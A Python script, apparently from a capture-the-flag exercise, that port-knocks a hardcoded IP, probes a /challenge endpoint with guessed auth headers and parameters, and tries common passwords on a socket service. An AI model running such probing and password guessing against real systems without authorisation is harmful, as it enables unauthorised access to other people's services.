#!/usr/bin/env python3
"""
Explore the /challenge endpoint
"""

import requests
import socket
import time

target_ip = "13.206.58.35"
base = f"http://{target_ip}:8080"

def knock_first():
    """Knock to open port 9999"""
    sequence = [9000, 2600, 1337]
    for port in sequence:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.3)

print("[*] Knocking...")
knock_first()
time.sleep(1)

print(f"\n[*] Exploring /challenge endpoint...")

# Try different methods
methods = ['GET', 'POST', 'PUT', 'HEAD', 'OPTIONS']

for method in methods:
    try:
        r = requests.request(method, base + "/challenge", timeout=3)
        print(f"\n[+] {method} /challenge -> {r.status_code}")
        if r.status_code != 403:
            print(f"    Headers: {dict(r.headers)}")
            if r.content:
                print(f"    Content: {r.text[:300]}")
    except Exception as e:
        print(f"[-] {method} failed: {e}")

# Try with authentication headers
print("\n[+] Trying with various headers...")
headers_to_try = [
    {"Authorization": "Bearer KAAL"},
    {"X-Auth": "KAAL"},
    {"X-Access-Token": "KAAL"},
    {"Cookie": "auth=KAAL"},
]

for headers in headers_to_try:
    try:
        r = requests.get(base + "/challenge", headers=headers, timeout=3)
        if r.status_code != 403:
            print(f"\n[!] Success with headers: {headers}")
            print(f"    Status: {r.status_code}")
            print(f"    Content: {r.text[:500]}")
    except:
        pass

# Try with query parameters
print("\n[+] Trying with query parameters...")
params_to_try = [
    {"key": "KAAL"},
    {"password": "KAAL"},
    {"auth": "KAAL"},
    {"token": "KAAL"},
]

for params in params_to_try:
    try:
        r = requests.get(base + "/challenge", params=params, timeout=3)
        if r.status_code != 403:
            print(f"\n[!] Success with params: {params}")
            print(f"    Status: {r.status_code}")
            print(f"    Content: {r.text[:500]}")
    except:
        pass

# Try to interact with the pwn service and see if it gives us a token
print("\n[+] Checking if pwn service gives us access token...")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((target_ip, 9999))
    
    banner = sock.recv(4096)
    print(f"Banner: {banner.decode('utf-8', errors='ignore')[:200]}")
    
    # Try some common passwords
    passwords = [b"KAAL\n", b"admin\n", b"password\n", b"sector7\n", b"9000\n"]
    
    for pwd in passwords:
        sock.send(pwd)
        time.sleep(0.5)
        try:
            response = sock.recv(4096)
            resp_text = response.decode('utf-8', errors='ignore')
            print(f"\nPassword {pwd.strip()}: {resp_text[:200]}")
            
            # Check if we got a token or download link
            if "token" in resp_text.lower() or "download" in resp_text.lower() or "http" in resp_text.lower():
                print(f"[!] FOUND SOMETHING: {resp_text}")
        except:
            pass
    
    sock.close()
except Exception as e:
    print(f"[-] Error: {e}")

print("\n[*] Complete")
